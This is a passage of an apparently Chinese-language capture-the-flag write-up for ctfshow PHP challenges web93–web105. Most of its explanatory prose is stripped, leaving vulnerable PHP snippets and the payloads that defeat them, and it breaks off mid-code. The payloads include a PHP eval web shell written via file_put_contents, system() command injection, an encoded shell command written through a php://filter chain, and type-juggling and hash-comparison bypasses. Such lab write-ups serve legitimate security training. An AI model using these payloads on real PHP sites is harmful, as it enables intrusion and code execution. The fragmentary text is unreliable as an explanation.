class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)==4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        echo intval($num,0);</span><br><span class=\"line\">    &#125; </span><br></pre></td></tr></table></figure>\n\n<p>e</p>\n<p>0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num===&quot;4476&quot;)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>0,if<code>===</code></p>\n<p> <code>4476.0</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=4476.0</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=+010574</span><br><span class=\"line\">?num= 010574//</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if($num==4476)&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class=\"line\">        die(&quot;no no no!!!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num,0)===4476)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>  <code>+</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num= 010574</span><br><span class=\"line\">?num=+010574</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class=\"line\">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;no no no&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>flag.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=./flag.php</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?u=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web97\"><a href=\"#web97\" class=\"headerlink\" title=\"web97\"></a>web97</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class=\"line\">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class=\"line\">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class=\"line\">echo $flag;</span><br><span class=\"line\">else</span><br><span class=\"line\">print &#x27;Wrong.&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>postaba!&#x3D;b</p>\n<p><code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code></p>\n<blockquote>\n<p>MD5NULL</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web98\"><a href=\"#web98\" class=\"headerlink\" title=\"web98\"></a>web98</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class=\"line\">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;` </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>GETpostgetflag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>flag&#x3D;flag,COOKIEget,flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;; </span><br></pre></td></tr></table></figure>\n\n<p>flag&#x3D;flag,SERVERget,flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__</span><br></pre></td></tr></table></figure>\n\n<p>HTTP_FLAG&#x3D;flag$flag</p>\n<p>get</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>GETpostget</p>\n<p>getpost</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num=1111</span><br><span class=\"line\"></span><br><span class=\"line\">post:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>\n\n<p>highlight_file($flag)$flagphp$flag</p>\n<h3 id=\"web99\"><a href=\"#web99\" class=\"headerlink\" title=\"web99\"></a>web99</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$allow = array();</span><br><span class=\"line\">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class=\"line\">    array_push($allow, rand(1,$i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;</span><br><span class=\"line\">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p><code>array_push</code></p>\n<blockquote>\n<p>array_push  </p>\n</blockquote>\n<p><code>in_array</code></p>\n<blockquote>\n<p>i</p>\n</blockquote>\n<p>ncontentn</p>\n<p>1</p>\n<p> 1.php <code>1.php == 1</code></p>\n<p>content</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?n=1.php</span><br><span class=\"line\"></span><br><span class=\"line\">POST:content=&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web100\"><a href=\"#web100\" class=\"headerlink\" title=\"web100\"></a>web100</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>is_numeric</code></p>\n<blockquote>\n<p> </p>\n</blockquote>\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;&amp; --&gt; || --&gt; = --&gt; and --&gt; or</span><br></pre></td></tr></table></figure>\n\n<p>and</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$v0=is_numeric($v1)</span><br></pre></td></tr></table></figure>\n\n<p>v1v2,v3</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>  <code>flag in class ctfshow; </code></p>\n<p><code>||</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)||&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web101\"><a href=\"#web101\" class=\"headerlink\" title=\"web101\"></a>web101</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;ctfshow.php&quot;);</span><br><span class=\"line\">//flag in class ctfshow;</span><br><span class=\"line\">$ctfshow = new ctfshow();</span><br><span class=\"line\">$v1=$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2=$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3=$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v0)&#123;</span><br><span class=\"line\">    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;</span><br><span class=\"line\">        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;</span><br><span class=\"line\">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); </span><br></pre></td></tr></table></figure>\n\n<p>wp</p>\n<p><code>ReflectionClasss</code></p>\n<blockquote>\n<p>ReflectionClass</p>\n<p>ReflectionClassPHP5Reflector<br>PHPnew ReflectionClass(system(cmd))</p>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>\n\n<p> 0x2d -  35</p>\n<h3 id=\"web102\"><a href=\"#web102\" class=\"headerlink\" title=\"web102\"></a>web102</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    file_put_contents($v3,$str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>substr</code></p>\n<blockquote>\n<p><strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] ) : string</p>\n<p> <code>string</code>  <code>start</code>  <code>length</code> </p>\n</blockquote>\n<p> <code>$s = substr($v2,2);</code>v2[2:],</p>\n<p><code>call_user_func</code></p>\n<blockquote>\n<p><strong>call_user_func</strong> ( <a href=\"php/language.types.callable.html\">callable</a> <code>$callback</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$parameter</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$...</code> ]] ) : <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a></p>\n<p> <code>callback</code> </p>\n</blockquote>\n<p>v1v3v2shell</p>\n<p>wp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`tac *`;  </span><br></pre></td></tr></table></figure>\n\n<p>hex3c3f3d60746163202a603b <br>base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YHRhYyAqYDs= //hex</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959485268597941715944733d</span><br></pre></td></tr></table></figure>\n\n<p> <code>3d</code></p>\n<p>v1&#x3D;hex2bin  v2&#x3D;00504438395948526859794171594473  v3&#x3D;php:&#x2F;&#x2F;1.php</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:v1=hex2bin</span><br><span class=\"line\"></span><br><span class=\"line\">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class=\"line\">        file_put_contents($v3,$str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&#x27;Sorry&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>\n\n<p>base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YGNhdCAqYDs</span><br></pre></td></tr></table></figure>\n\n<p>ascii</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959474e6864434171594473</span><br></pre></td></tr></table></figure>\n\n<p>e</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>sha(a[])null  null&#x3D;&#x3D;null</p>\n<h3 id=\"web105\"><a href=\"#web105\" class=\"headerlink\" title=\"web105\"></a>web105</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$error=&#x27;flag&#x27;;</span><br><span class=\"line\">$suces=&#x27;&#x27;;</span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;foreach($_POST as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;</span><br><span class=\"line\">die($suces); </span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    